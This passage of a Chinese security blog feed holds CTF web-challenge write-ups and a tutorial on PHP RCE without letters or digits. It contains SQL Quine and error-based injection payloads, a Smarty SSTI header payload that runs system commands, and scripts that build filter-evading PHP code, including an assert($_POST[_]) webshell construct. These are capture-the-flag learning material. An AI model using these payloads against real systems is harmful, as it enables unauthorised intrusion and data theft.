class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;bilala&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only bilala can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;nothing found&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>密码正确了但没完全正确属于是 怪哦</p><p>这个知识是sql的<a href="https://www.cnblogs.com/zhengna/p/15917521.html">Quine注入</a> 利用<code>replace()</code>构造完全一致的输入和输出</p><p>最终payload</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="keyword">replace</span>(<span class="keyword">replace</span>(&#x27;<span class="string">&quot;/**/union/**/select/**/replace(replace(&quot;</span>%<span class="string">&quot;,0x22,0x27),0x25,&quot;</span>%<span class="string">&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">&quot;%&quot;</span>,0x22,0x27),0x25,<span class="string">&quot;%&quot;</span>)#&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220406212140.png"></p><h1 id="join-us"><a href="#join-us" class="headerlink" title="join_us"></a>join_us</h1><p>题目里只有一个登录能用，注册服务器会返回405</p><p>界面长这样</p><p><img src="/images/BUU/20220404223008.png"></p><p>输入到<code>4</code>失去回显，那么默认表至少有三条数据</p><p>再上fuzz测试，<code>union</code>重伤倒地，感觉联合注入没戏，但是没有过滤<code>extractvalue</code>，可以试试报错注入</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;||extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select group_concat(table_name)from mysql.innodb_table_stats), <span class="number">0</span>x7e))#</span><br></pre></td></tr></table></figure><p>虽然fuzz说<code>or</code>没被过滤但在用的时候还是被拦了，可能有其它的隐式规则叭 用<code>||</code>作替代</p><p><code>database</code>被ban了，查表就用<code>mysql.innodb_table_stats</code>代替。</p><p><img src="/images/BUU/20220404224228.png"></p><p>最后得知表格共有<code>FLAG_TABLE,news,users,gtid_slaave_pos,Fal_flag,output</code>这些。</p><p><code>column</code>关键字又被ban了，尝试用<a href="https://zhuanlan.zhihu.com/p/98206699">无列名注入</a></p><p>flag在<code>output</code>表里，其它两大两个带flag字段的表都是假的，不是真的（大悲</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=<span class="number">1&#x27;</span>|| extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> output a <span class="keyword">join</span> output)c),<span class="number">0x7e</span>))<span class="meta">#</span></span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220405225118.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tt</span>=<span class="number">1</span>&#x27;|| extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select mid(data,<span class="number">1</span>,<span class="number">30</span>) from output),<span class="number">0</span>x7e))#</span><br><span class="line"></span><br><span class="line"><span class="attribute">tt</span>=<span class="number">1</span>&#x27;|| extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select mid(data,<span class="number">31</span>,<span class="number">60</span>) from output),<span class="number">0</span>x7e))#</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220405225246.png"></p><p><img src="/images/BUU/20220405225205.png"></p><h1 id="midlevel"><a href="#midlevel" class="headerlink" title="midlevel"></a>midlevel</h1><p><img src="/images/BUU/20220404160230.png"></p><p>我一看 哇 代码块中突然钻出来一个smarty</p><p>再加上</p><p><img src="/images/BUU/20220404160548.png"></p><p>通过构造<code>X-Forwarded-For</code>请求头就可以完成ssti啦</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">X-Forwarded-For: </span><span class="template-variable">&#123;<span class="keyword">if</span> system(&#x27;cat /flag&#x27;)&#125;</span><span class="template-tag">&#123;/<span class="name">if</span>&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220404160802.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;checkin&quot;&gt;&lt;a href=&quot;#checkin&quot; class=&quot;headerlink&quot; title=&quot;checkin&quot;&gt;&lt;/a&gt;checkin&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title function_ invoke__&quot;&gt;error_reporting&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// ‮⁦NISACTF⁩⁦Welcome to&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&amp;quot;jitanglailo&amp;quot;&lt;/span&gt; == &lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[ahahahaha] &amp;amp;‮⁦+!!⁩⁦&amp;amp; &lt;span class=&quot;string&quot;&gt;&amp;quot;‮⁦ Flag!⁩⁦N1SACTF&amp;quot;&lt;/span&gt; == &lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[‮⁦Ugeiwo⁩⁦cuishiyuan]) &amp;#123; &lt;span class=&quot;comment&quot;&gt;//tnnd! weishenme b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$FLAG&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title function_ invoke__&quot;&gt;show_source&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
    <category term="python" scheme="https://www.m0x01sery.com/tags/python/"/>
    
    <category term="sql" scheme="https://www.m0x01sery.com/tags/sql/"/>
    
    <category term="ssti" scheme="https://www.m0x01sery.com/tags/ssti/"/>
    
    <category term="rce" scheme="https://www.m0x01sery.com/tags/rce/"/>
    
    <category term="ssrf" scheme="https://www.m0x01sery.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字RCE初探</title>
    <link href="https://www.m0x01sery.com/2022/03/28/rce-without-w-and-n/"/>
    <id>https://www.m0x01sery.com/2022/03/28/rce-without-w-and-n/</id>
    <published>2022-03-27T16:00:00.000Z</published>
    <updated>2022-03-31T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>没有blacklist的rce是没有灵魂的！</p><p>有人说，说是有人在blacklist里下了毒（指<code>/[a-zA-Z0-9]+/</code></p><p>害羞羞，你看你就会开玩笑（指绕过</p><span id="more"></span><p>本地写个青春版开冲</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><h1 id="鸡汤来咯"><a href="#鸡汤来咯" class="headerlink" title="鸡汤来咯"></a>鸡汤来咯</h1><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>按位取反，入坑以来最先接触到的姿势，温故而知新。</p><p>举个栗子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">233</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(~<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># int(-234)</span></span><br></pre></td></tr></table></figure><p><code>233</code>的二进制值为<code>0000 0000 1110 1001</code></p><p>按位取反得<code>1111 1111 0001 0110</code>，即<code>-234</code>。</p><p>ps：我们可能更熟悉长成<code>1000 0000 1110 1010</code>的<code>-234</code>，其实它们是等价的，只是表示方法不同。前者是补码形式，后者是原码形式，最高位都为符号位。关于<a href="https://www.cnblogs.com/ydqblogs/p/13823206.html">原码，反码，补码</a></p><p>那么对于字母而言，我们也就能通过其他字符加上取反操作得到我们想到的组合了。</p><p>大部分情况下都会加上<code>urlencode()</code>，出现乱码总是很老火的说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span></span><br></pre></td></tr></table></figure><p>最终payload为<code>(%8F%97%8F%96%91%99%90)();</code>。</p><p>相信不止我一个人在刚接触这种姿势时认为，将<code>phpinfo();</code>这完整的函数进行取反不是能减少一些操作嘛，为什么要单独取反函数名再加上括号和分号呢？</p><p>让我们把这段代码再回下锅</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><p><code>eval()</code>首先执行的操作是取反<code>~</code>，而取反后的最终结果只会是单纯的字符串。得出<code>phpinfo</code>后，如果再加上外部的括号，得到的实际上是<code>(&#39;phpinfo&#39;)()</code>，经过<code>eval()</code>的解析，在php7及以上版本中这种写法会被认为是函数，因此会执行后续的payload。分号作为一句完整代码的结束标志，就和平时写代码一样。</p><p>我们将括号分号一齐加入取反的队伍，取反后得到了<code>phpinfo();</code>，看似没有多大差别，但我们要知道，这是一串字符串，只是一串字符串。<code>eval()</code>对单纯的字符串又有什么坏心思呢？于是就没有后续了。（悲</p><p>试着写了个很挫的脚本 学习为主 轻喷（demo版 后面会继续升级的 这还不够智能 瘫</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn($func1 [, $func2] [, $param])</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;var_dump&#x27;</span>, <span class="string">&#x27;ini_get&#x27;</span>, <span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$func1</span>, <span class="variable">$func2</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$param</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$negat_func1</span> = ~<span class="variable">$func1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)());&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$negat_param</span> = ~<span class="variable">$param</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;)));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>万恶之源 我很异或（疑惑）的出处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">1</span>;  <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">0</span>;  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">0</span>^<span class="number">0</span>;  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>在php中两个字符串异或之后，得到的还是一个字符串。基于此我们也能做到无字母数字构造payload。</p><p>选择异或的理由？同或不行吗？当然可以!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>|<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment"># c</span></span><br></pre></td></tr></table></figure><p>不过异或运算的一大特点是<strong>运算可逆</strong>，异或字符和被异或字符运算的结果能倒着异或回去得到相同的结果，相对同或来说，这为我们寻找payload提供了莫大的便利。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># @</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># a</span></span><br></pre></td></tr></table></figure><p>（脚本绝赞升级中）</p><h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>php的字符自增和C的ASCII值自增有很大不同。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># aa</span></span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># ab</span></span><br></pre></td></tr></table></figure><p>同时我们要注意字符变量只能递增，不能递减，且只支持纯字母（a-z 和 A-Z），递增或递减其他字符变量是没有用的哦。</p><p>基于此特性，我们要想获得小写字母，就要从<code>a</code>开始自增，要想获得大写字母，就从<code>A</code>开始。</p><p>同时，在php中如果强制连接数组和字符串，会发生强制类型转换，数组将被转为字符串，且值为<code>Array</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = [];</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$b</span>; <span class="comment"># Array</span></span><br></pre></td></tr></table></figure><p>好巧不巧，这<code>Array</code>里不仅有<code>A</code>还有<code>a</code>，再配合自增，我们就能构造出任意英文字母了。</p><p>自搓脚本 梅开二度（指很拉的构造 太弱小了 没有力量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span> = [].<span class="string">&#x27;&#x27;</span>;          <span class="comment"># $__ = &#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>[<span class="string">&#x27;!&#x27;</span> == <span class="string">&#x27;?&#x27;</span>]; <span class="comment"># $_ = $__[0];</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>;            <span class="comment"># A</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$____</span> = ++<span class="variable">$_</span>;         <span class="comment"># E</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_____</span> = ++<span class="variable">$_</span>;        <span class="comment"># O</span></span><br><span class="line"><span class="variable">$______</span> = ++<span class="variable">$_</span>;       <span class="comment"># P</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_______</span> = ++<span class="variable">$_</span>;      <span class="comment"># R</span></span><br><span class="line"><span class="variable">$________</span> = ++<span class="variable">$_</span>;     <span class="comment"># S</span></span><br><span class="line"><span class="variable">$_________</span> = ++<span class="variable">$_</span>;    <span class="comment"># T</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$___</span>.<span class="variable">$________</span>.<span class="variable">$________</span>.<span class="variable">$____</span>.<span class="variable">$_______</span>.<span class="variable">$_________</span>)(<span class="string">&#x27;$_&#x27;</span>.<span class="variable">$______</span>.<span class="variable">$_____</span>.<span class="variable">$________</span>.<span class="variable">$_________</span>.<span class="string">&#x27;[_];&#x27;</span>);</span><br><span class="line"><span class="comment"># (&#x27;ASSERT&#x27;)(&#x27;$_POST[_];&#x27;);</span></span><br></pre></td></tr></table></figure><p>看着熟悉的<code>eval()</code>消失在payload里，心态逐渐发生了一些微妙的变化</p><p>事实上，<code>assert()</code>的构造在php7中和<code>eval()</code>一样，也变成了一种语言结构而不是一个函数，这导致此类payload在php7及以上版本环境中全部无效。</p><p><a href="https://www.anquanke.com/post/id/173201">浅谈eval和assert</a>对此做了一些补充说明。</p><p>真搞事还得是<code>system()</code>啊（确信</p><p>又由于自增类型的payload太长，非常容易被长度限制，因此命令执行还是用取反或者异或叭。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;没有blacklist的rce是没有灵魂的！&lt;/p&gt;
&lt;p&gt;有人说，说是有人在blacklist里下了毒（指&lt;code&gt;/[a-zA-Z0-9]+/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;害羞羞，你看你就会开玩笑（指绕过&lt;/p&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
    <category term="rce" scheme="https://www.m0x01sery.com/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF2022 InterestingPHP 复现</title>
    <link href="https://www.m0x01sery.com/2022/03/20/[VN2022]InterestingPHP/"/>
    <id>https://www.m0x01sery.com/2022/03/20/[VN2022]InterestingPHP/</id>
    <published>2022-03-19T16:00:00.000Z</published>
    <updated>2022-03-29T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>虽然这道题不看其他师傅们的wp是真的搞不动，完全是一步一步照着师傅们的脚步走的，但这道题收获的最大的其实是我们做题时该有的思路了。</p><p>从过滤受阻开始，信息收集、定点攻击，到反弹shell、权限提升，更加明确和清晰的进攻思路，才是完成这次复现后想要收获的。</p><p>我是一个一个一个卡其脱离太啊啊啊啊啊啊啊（指禁止停下刷题</p><span id="more"></span><h1 id="食材复刻"><a href="#食材复刻" class="headerlink" title="食材复刻"></a>食材复刻</h1><p>开幕RCE 注定这道题不会简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>试了常用命令都无回显，phpinfo也被禁止，但神奇的<code>ini_get_all()</code>能帮我们获取php配置信息，太棒了</p><p><code>?exp=var_dump(ini_get_all());</code> 直奔<code>disable</code>系列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">disable_classes</span><br><span class="line"></span><br><span class="line"><span class="built_in">Exception</span>,<span class="built_in">DirectoryIterator</span>,<span class="built_in">FilesystemIterator</span>,<span class="built_in">SplFileObject</span>,<span class="built_in">SplDoublyLinkedList</span>,<span class="built_in">Error</span>,<span class="built_in">ErrorException</span>,RedisException</span><br></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">disable_functions</span><br><span class="line"></span><br><span class="line">include,include_once,require,require_once,stream_get_contents,<span class="keyword">fwrite</span>,readfile,file_get_contents,<span class="keyword">fread</span>,fgets,fgetss,<span class="keyword">file</span>,parse_ini_file,show_source,fsockopen,proc_open,ini_set,pfsockopen,ini_alter,ini_get,posix_kill,phpinfo,<span 